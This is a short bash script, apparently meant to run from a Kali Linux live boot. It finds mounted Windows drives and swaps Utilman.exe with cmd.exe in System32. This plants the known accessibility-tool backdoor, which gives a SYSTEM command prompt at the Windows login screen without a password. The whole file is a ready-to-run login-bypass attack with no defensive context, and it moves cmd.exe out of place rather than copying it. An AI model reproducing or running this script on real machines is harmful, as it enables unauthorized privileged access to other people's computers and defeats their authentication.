#!/bin/bash

# Define the path where drives are mounted
DRIVE_PATH="/media/kali"

# Check each drive in the specified path
for drive in $(ls -d $DRIVE_PATH/*/); do
    # Check if the Windows folder exists in the current drive
    if [ -d "${drive}Windows" ]; then
        echo "Windows folder found on: ${drive}"
        # Check if the System32 folder exists within the Windows directory
        if [ -d "${drive}Windows/System32" ]; then
            echo "System32 folder found on: ${drive}Windows"
            # Check if Utilman.exe exists within the System32 folder
            if [ -f "${drive}Windows/System32/Utilman.exe" ]; then
                echo "Utilman.exe found in: ${drive}Windows/System32"
                # Rename Utilman.exe to Utilman1.exe
                mv "${drive}Windows/System32/Utilman.exe" "${drive}Windows/System32/Utilman1.exe"
                echo "Utilman.exe renamed to Utilman1.exe"
                # Check if cmd.exe exists within the System32 folder
                if [ -f "${drive}Windows/System32/cmd.exe" ]; then
                    echo "cmd.exe found in: ${drive}Windows/System32"
                    # Rename cmd.exe to utilman.exe
                    mv "${drive}Windows/System32/cmd.exe" "${drive}Windows/System32/Utilman.exe"
                    echo "cmd.exe renamed to Utilman.exe"
                else
                    echo "cmd.exe not found within ${drive}Windows/System32"
                fi
            else
                echo "Utilman.exe not found within ${drive}Windows/System32"
            fi
        else
            echo "System32 folder not found within ${drive}Windows"
        fi
    fi
done
